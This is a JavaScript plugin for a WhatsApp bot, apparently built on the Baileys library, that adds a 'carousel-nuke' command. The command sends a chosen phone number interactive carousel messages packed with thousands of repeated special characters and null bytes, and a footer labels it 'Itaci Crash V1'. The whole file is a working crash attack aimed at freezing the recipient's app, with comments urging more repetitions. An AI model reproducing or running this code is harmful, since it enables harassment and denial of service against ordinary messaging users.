import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

async function carouselNew(conn, isTarget) {
  for (let i = 0; i < 2; i++) { // Puedes subir a 20 si funciona bien
    let push = [];

    for (let j = 0; j < 10; j++) {
      push.push({
        body: { text: "CikssXyz" + "ꦾ".repeat(5000) },
        footer: { text: "dont panic!!" },
        header: {
          title: 'memekk' + "\u0000".repeat(1000),
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mimetype: "image/jpeg",
            fileLength: "591",
            height: 0,
            width: 0,
            jpegThumbnail: Buffer.from([]), // Opcional, o elimina si da error
          }
        },
        nativeFlowMessage: { buttons: [] }
      });
    }

    const message = generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: { text: "Kontol " + "ꦾ".repeat(10000) },
            footer: { text: "( 🐉 ) Itaci Crash V1 ( 🐉 )" },
            header: { hasMediaAttachment: false },
            carouselMessage: { cards: push }
          }
        }
      }
    }, {});

    await conn.relayMessage(isTarget, message.message, {
      messageId: message.key.id
    });

    console.log("✅ Carousel enviado");
  }
}

// 🔓 Comando sin restricción
let handler = async (m, { conn, args, command }) => {
  const target = args[0];
  if (!target) return m.reply(`⛔ Uso: .${command} número o JID`);

  try {
    await carouselNew(conn, target);
    m.reply('✅ Carrusel enviado.');
  } catch (e) {
    console.error("❌ Error:", e);
    m.reply('❌ Error ejecutando:\n' + (e.message || e));
  }
};

handler.command = /^carousel-nuke$/i;
export default handler;